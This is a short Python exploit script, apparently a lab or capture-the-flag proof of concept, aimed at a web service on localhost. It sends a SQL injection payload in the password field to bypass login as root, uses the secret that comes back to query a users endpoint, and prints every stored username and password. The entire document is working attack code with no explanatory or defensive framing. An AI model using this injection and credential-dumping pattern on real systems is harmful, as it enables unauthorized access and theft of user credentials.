import requests

username = "root"
password = "' or ''='"

resp = requests.get(f'http://127.0.0.1:5000/?username={username}&password={password}')

secret = resp.json()['secret']

resp = requests.get(f'http://127.0.0.1:5000/users?secret={secret}')

for user in resp.json():
    print(user['username'], user['password'])
